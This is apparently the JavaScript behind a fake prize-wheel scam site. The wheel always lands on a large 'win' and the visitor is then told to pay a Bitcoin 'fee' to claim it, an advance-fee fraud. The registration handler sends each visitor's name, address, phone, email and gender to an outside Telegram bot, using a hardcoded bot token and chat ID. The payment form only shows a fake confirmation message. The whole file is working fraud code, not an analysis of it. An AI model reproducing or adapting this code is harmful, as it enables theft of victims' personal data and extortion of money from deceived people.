const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
const TELEGRAM_CHAT_ID = "874563737";  // Replace this with your actual chat ID
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const prizes = [
    { amount: '$50,000.00', fee: '$500' },
    { amount: '$100,000.00', fee: '$1000' },
    { amount: '$125,000.00', fee: '$1250' },
    { amount: '$150,000.00', fee: '$1500' },
    { amount: '$175,000.00', fee: '$1750' },
    { amount: '$200,000.00', fee: '$2000' },
    { amount: '$250,000.00', fee: '$2500' },
    { amount: '$300,000.00', fee: '$3000' },
    { amount: '$450,000.00', fee: '$4500' },
    { amount: '$500,000.00', fee: '$5000' },
    { amount: '$600,000.00', fee: '$6000' },
    { amount: '$800,000.00', fee: '$8000' },
    { amount: '$850,000.00', fee: '$8500' },
    { amount: '$900,000.00', fee: '$9000' },
    { amount: '$1,000,000.00', fee: '$10000' }
];

let perfecthalf = ((1 / 37) * 360) / 2;
let currentLength = perfecthalf;
$(".wheel img").css("transform", "rotate(" + perfecthalf + "deg)");

$(".spin").click(() => {
    $(".wheel img").css("filter", "blur(8px)");
    let spininterval = getRandomInt(0, 37) * (360 / 37) + getRandomInt(3, 4) * 360;
    currentLength += spininterval;
    let numofsecs = spininterval;

    console.log(currentLength);
    $(".wheel img").css("transform", "rotate(" + currentLength + "deg)");

    setTimeout(function () {
        $(".wheel img").css("filter", "blur(0px)");
        displayResult(currentLength);
    }, numofsecs);
});

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function displayResult(angle) {
    const segmentAngle = 360 / 37; // Assuming 37 segments for the roulette
    const index = Math.floor(((360 - angle % 360) % 360) / segmentAngle);
    const prize = prizes[index % prizes.length];

    const resultElement = document.getElementById('result');
    resultElement.innerText = `🎉 Congratulations! You have won ${prize.amount}!`;
    showCertificate(prize);
}

function showCertificate(prize) {
    const registrationData = getRegistrationData();
    document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
    document.getElementById('paymentAmount').innerText = prize.fee;
    document.getElementById('result').style.display = 'none';
    document.getElementById('certificate').style.display = 'block';
}

function getRegistrationData() {
    return JSON.parse(localStorage.getItem('registrationData'));
}

if (document.getElementById('downloadCertificate')) {
    document.getElementById('downloadCertificate').addEventListener('click', function() {
        const certificateText = document.getElementById('certificateText').innerText;
        const blob = new Blob([certificateText], { type: 'text/plain' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = 'certificate.txt';
        link.click();
    });
}

if (document.getElementById('payBitcoin')) {
    document.getElementById('payBitcoin').addEventListener('click', function() {
        window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
    });
}

if (document.getElementById('bitcoinPaymentForm')) {
    document.addEventListener('DOMContentLoaded', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount');
        if (document.getElementById('amount')) {
            document.getElementById('amount').value = amount;
        }
    });

    document.getElementById('bitcoinPaymentForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const paymentData = new FormData(e.target);
        const paymentInfo = {};
        paymentData.forEach((value, key) => {
            paymentInfo[key] = value;
        });

        alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
    });
}

document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(e.target);
    const registrationData = {};
    formData.forEach((value, key) => {
        registrationData[key] = value;
    });

    localStorage.setItem('registrationData', JSON.stringify(registrationData));

    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    }).then(response => response.json()).then(data => {
        if (data.ok) {
            document.getElementById('registration').style.display = 'none';
            document.getElementById('gameSelection').style.display = 'block';
        } else {
            alert('Registration failed. Please try again.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Registration failed. Please try again.');
    });
});
